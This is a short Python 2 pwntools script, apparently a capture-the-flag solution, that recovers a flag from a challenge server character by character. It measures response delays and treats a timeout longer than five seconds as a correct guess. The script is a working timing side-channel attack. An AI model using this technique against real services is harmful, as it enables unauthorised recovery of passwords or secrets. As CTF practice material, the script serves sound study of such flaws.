#!/usr/bin/env python2

# imports
from pwn import remote
import time
import string

# creating a var that stores all lower and uppercase alphabets, punctuation and numbers
charset = string.ascii_lowercase + string.ascii_uppercase + string.punctuation + string.digits

# we can set the flag to start with HNF{ as all flags start in this format.
flag = "HNF{"
while flag[-1] != "}": # loop until flag is complete
    for c in charset:
        print "\nTesting {} now\n".format(c)
        r = remote("ctf.yadunut.com", 8003) # connecting to server
        r.recv()

        # get 1st time
        before = time.time()
        r.sendline(flag + c) # send flag with guessed char
        r.recv()
        # 2nd time for comparison
        after = time.time()
        difference = after-before # finding the difference in time to determine if there was a timeout
        r.close()

        if difference > 5: # if there was a timeout, char is correct and added to flag string
            flag+=c
            print "CHAR FOUND!!"
            print "Current Flag: {}".format(flag)
            break
        

print "FOUND FLAG!!\nFlag: {}".format(flag)
